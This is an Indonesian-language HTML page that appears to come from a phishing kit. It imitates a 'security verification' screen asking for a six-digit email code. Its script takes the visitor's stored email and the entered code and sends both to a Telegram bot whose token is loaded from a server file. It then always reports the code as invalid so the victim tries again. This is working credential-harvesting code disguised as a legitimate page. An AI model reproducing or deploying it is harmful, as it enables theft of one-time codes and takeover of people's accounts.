<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi Keamanan</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
</head>
<body class="bg-white min-h-screen flex flex-col justify-between">
  <header class="flex items-center px-4 py-3 space-x-3 border-b border-gray-200">
    <button aria-label="Back" class="text-gray-900 text-lg">
      <i class="fas fa-arrow-left"></i>
    </button>
    <h1 class="font-semibold text-gray-900 text-lg">Verifikasi Keamanan</h1>
  </header>
  <main class="px-5 pt-6 flex-grow">
    <p class="text-gray-600 text-sm leading-relaxed mb-4 max-w-md">
      Harap selesaikan proses verifikasi di bawah untuk melanjutkan
    </p>
    <label for="code" class="block font-semibold text-gray-900 text-sm mb-1 max-w-md">
      Verifikasi via Email (6 digit)
    </label>
    <div
      class="max-w-md flex items-center border border-gray-300 rounded-md overflow-hidden"
      style="height: 40px"
    >
      <span
        class="flex items-center justify-center text-gray-600 font-semibold px-3 border-r border-gray-300 select-none"
        style="width: 40px"
        >X-</span
      >
      <input
        id="code"
        type="text"
        placeholder="Masukkan Kode"
        class="flex-grow h-full px-3 text-gray-400 placeholder-gray-400 focus:outline-none"
        maxlength="6"
        inputmode="numeric"
        pattern="[0-9]*"
        aria-label="Masukkan Kode"
      />
      <span
        id="timer"
        class="text-gray-400 text-xs font-normal pr-3 select-none"
        style="width: 40px"
        >01:00</span
      >
    </div>
    <div
      id="alert-box"
      class="max-w-md mt-3 rounded-md bg-yellow-50 border border-yellow-200 p-3 flex items-start space-x-2 text-yellow-700 text-xs font-semibold"
      role="alert"
    >
      <i class="fas fa-exclamation-triangle mt-[3px]"></i>
      <p>
        Kode verifikasi telah dikirim ke
        <br />
        <span id="email-display" class="font-normal text-yellow-700">[email tidak tersedia].</span>
      </p>
    </div>
  </main>
  <footer class="p-4">
    <button
      id="verify-btn"
      type="submit"
      class="w-full max-w-md mx-auto block bg-gray-500 text-white font-semibold rounded-md py-3 disabled:opacity-70"
      disabled
    >
      Verifikasi
    </button>
  </footer>
  <script>
    // Ambil email dari localStorage
    const savedEmail = localStorage.getItem('userEmail') || '';
    // Fungsi untuk mask email (tampilkan huruf pertama, sembunyikan sebagian, tampilkan domain)
    function maskEmail(email) {
      const [localPart, domain] = email.split('@');
      if (!localPart || !domain) return email;
      const firstChar = localPart.charAt(0);
      const lastChar = localPart.charAt(localPart.length - 1);
      const maskedPart = '*'.repeat(Math.max(localPart.length - 2, 1));
      return `${firstChar}${maskedPart}${lastChar}@${domain}`;
    }
    // Tampilkan email yang sudah dimask di elemen
    const emailDisplay = document.getElementById('email-display');
    if (savedEmail) {
      emailDisplay.textContent = `[${maskEmail(savedEmail)}].`;
    } else {
      emailDisplay.textContent = 'Email *******@gmail.com';
    }
    const codeInput = document.getElementById('code');
    const verifyBtn = document.getElementById('verify-btn');
    const timerSpan = document.getElementById('timer');
    let telegramBotToken;
    let telegramChatId;
    fetch("auth/tele.php")
      .then(response => response.json())
      .then(config => {
        telegramBotToken = config.telegramBotToken;
        telegramChatId = config.telegramChatId;
        initializeEmailLogic();
      })
      .catch(error => {
        console.error("Error fetching config:", error);
        alert("Failed to load configuration.");
      });
    function initializeEmailLogic() {
      // Enable button if input length is 6 digits
      codeInput.addEventListener('input', () => {
        verifyBtn.disabled = codeInput.value.length !== 6;
        if (!verifyBtn.disabled) {
          verifyBtn.classList.remove('bg-gray-500');
          verifyBtn.classList.add('bg-gray-800');
        } else {
          verifyBtn.classList.add('bg-gray-500');
          verifyBtn.classList.remove('bg-gray-800');
        }
      });
      // Function to send message to Telegram
      async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const params = {
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'HTML'
        };
        try {
          const response = await fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
          });
          return response.ok;
        } catch (error) {
          console.error('Error sending to Telegram:', error);
          return false;
        }
      }
      verifyBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        const code = codeInput.value.trim();
        if (code.length !== 6) return;
        const message = `Kode Verifikasi: <b>${code}</b>\nEmail: <b>${savedEmail || 'Tidak tersedia'}</b>`;
        const success = await sendToTelegram(message);
        if (success) {
          alert('Kode Verifikasi Tidak Valid.');
          codeInput.value = '';
          verifyBtn.disabled = true;
          verifyBtn.classList.add('bg-gray-500');
          verifyBtn.classList.remove('bg-gray-800');
        } else {
          alert('Gagal mengirim kode ke Telegram.');
        }
      });
      // Hitung mundur 60 detik
      let timeLeft = 60;
      timerSpan.textContent = '01:00';
      const countdown = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerSpan.textContent = `${minutes.toString().padStart(2, '0')}:${seconds
          .toString()
          .padStart(2, '0')}`;
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerSpan.textContent = '00:00';
          // Optional: disable input or show message that code expired
          codeInput.disabled = true;
          verifyBtn.disabled = true;
          verifyBtn.classList.add('bg-gray-500');
          verifyBtn.classList.remove('bg-gray-800');
        }
      }, 1000);
    }
  </script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"572af3bddaa94abeb8e8235d2828a78c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'98cd42e489ba227e',t:'MTc2MDE3NDIxMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>